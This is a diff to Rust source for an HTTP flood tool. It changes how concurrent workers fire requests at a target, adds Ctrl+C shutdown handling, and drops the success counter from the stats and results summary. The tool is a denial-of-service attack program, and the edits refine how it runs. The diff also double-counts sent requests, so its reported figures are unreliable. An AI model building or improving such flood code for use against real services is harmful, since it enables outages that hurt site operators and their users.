@@ -92,7 +92,6 @@ impl HttpMethod {
 #[derive(Debug, Default)]
 pub struct FloodStats {
     pub total_sent: AtomicU64,
-    pub total_ok: AtomicU64,
     pub total_err: AtomicU64,
 }
 
@@ -100,7 +99,6 @@ impl FloodStats {
     pub fn snapshot(&self) -> FloodSnapshot {
         FloodSnapshot {
             sent: self.total_sent.load(Ordering::Relaxed),
-            ok: self.total_ok.load(Ordering::Relaxed),
             err: self.total_err.load(Ordering::Relaxed),
         }
     }
@@ -110,7 +108,6 @@ impl FloodStats {
 #[derive(Debug, Clone, Copy)]
 pub struct FloodSnapshot {
     pub sent: u64,
-    pub ok: u64,
     pub err: u64,
 }
 
@@ -141,21 +138,29 @@ pub async fn start_flood(cfg: HttpFloodConfig) -> Result<FloodSnapshot> {
 
     let running = Arc::new(std::sync::atomic::AtomicBool::new(true));
     let r = running.clone();
+    let shutdown = Arc::new(tokio::sync::Notify::new());
+    let s = shutdown.clone();
     tokio::spawn(async move {
         tokio::signal::ctrl_c().await.ok();
+        // Print a newline so ^C has its own line before the log
+        eprintln!();
         log::info!("Ctrl+C received, shutting down flood...");
         r.store(false, Ordering::SeqCst);
+        s.notify_waiters();
     });
 
     // Periodic stats reporter
     let stats_report = stats.clone();
+    let shutdown_reporter = shutdown.clone();
     let report_handle = tokio::spawn(async move {
-        let mut interval = tokio::time::interval(Duration::from_secs(5));
-        interval.tick().await;
         loop {
-            interval.tick().await;
-            let s = stats_report.snapshot();
-            log::info!("[flood] sent={} ok={} err={}", s.sent, s.ok, s.err);
+            tokio::select! {
+                _ = tokio::time::sleep(Duration::from_secs(5)) => {
+                    let s = stats_report.snapshot();
+                    log::info!("[flood] sent={} err={}", s.sent, s.err);
+                }
+                _ = shutdown_reporter.notified() => break,
+            }
         }
     });
 
@@ -170,6 +175,7 @@ pub async fn start_flood(cfg: HttpFloodConfig) -> Result<FloodSnapshot> {
 
     // Spawn worker tasks
     let mut tasks = Vec::new();
+    let shutdown_wait = shutdown.clone();
 
     for _worker_id in 0..cfg.concurrency {
         let stats = stats.clone();
@@ -181,6 +187,7 @@ pub async fn start_flood(cfg: HttpFloodConfig) -> Result<FloodSnapshot> {
         let client = client.clone();
         let body_template = body_template.clone();
         let method = method;
+        let shutdown = shutdown.clone();
 
         tasks.push(tokio::spawn(async move {
             let mut req_id: u64 = 0;
@@ -192,7 +199,11 @@ pub async fn start_flood(cfg: HttpFloodConfig) -> Result<FloodSnapshot> {
                     break;
                 }
 
-                let _permit = semaphore.acquire().await;
+                // Wait for semaphore OR shutdown signal
+                let _permit = tokio::select! {
+                    permit = semaphore.acquire() => permit,
+                    _ = shutdown.notified() => break,
+                };
                 stats.total_sent.fetch_add(1, Ordering::Relaxed);
                 req_id += 1;
 
@@ -219,12 +230,16 @@ pub async fn start_flood(cfg: HttpFloodConfig) -> Result<FloodSnapshot> {
                     req = req.body(body);
                 }
 
-                // Fire and FORGET
-                tokio::spawn(async move {
-                    let _ = req.send().await;
-                });
+                // Fire request — await just enough to complete the TCP/TLS
+                // handshake and send the request bytes, then drop everything.
+                // This is bounded by the semaphore: at most `concurrency`
+                // requests are in-flight at any time.
+                tokio::select! {
+                    _ = req.send() => {},
+                    _ = shutdown.notified() => {},
+                }
 
-                stats.total_ok.fetch_add(1, Ordering::Relaxed);
+                stats.total_sent.fetch_add(1, Ordering::Relaxed);
                 drop(_permit);
 
                 if delay > Duration::ZERO {
@@ -234,16 +249,24 @@ pub async fn start_flood(cfg: HttpFloodConfig) -> Result<FloodSnapshot> {
         }));
     }
 
-    // Wait for all workers to finish
-    for task in tasks {
-        let _ = task.await;
+    // Wait for all workers to complete, or abort on shutdown
+    let shutdown_clone = shutdown.clone();
+    tokio::select! {
+        _ = async {
+            for task in tasks {
+                let _ = task.await;
+            }
+        } => {}
+        _ = shutdown_clone.notified() => {
+            log::info!("Aborting remaining workers...");
+        }
     }
 
     report_handle.abort();
     let final_snapshot = stats.snapshot();
     log::info!(
-        "[flood] FINISHED — sent={} ok={} err={}",
-        final_snapshot.sent, final_snapshot.ok, final_snapshot.err
+        "[flood] FINISHED — sent={} err={}",
+        final_snapshot.sent, final_snapshot.err
     );
 
     Ok(final_snapshot)
@@ -253,12 +276,7 @@ pub async fn start_flood(cfg: HttpFloodConfig) -> Result<FloodSnapshot> {
 pub fn print_flood_summary(snapshot: &FloodSnapshot) {
     println!("┌─ HTTP Flood Results ──────────────────────────");
     println!("│ Requests    : {}", snapshot.sent);
-    println!("│ Connect OK  : {}", snapshot.ok);
-    println!("│ Connect Err : {}", snapshot.err);
-    if snapshot.sent > 0 {
-        let rate = (snapshot.ok as f64 / snapshot.sent as f64) * 100.0;
-        println!("│ Success rate: {:.1}%", rate);
-    }
+    println!("│ Errors      : {}", snapshot.err);
     println!("└────────────────────────────────────────────────");
 }
 
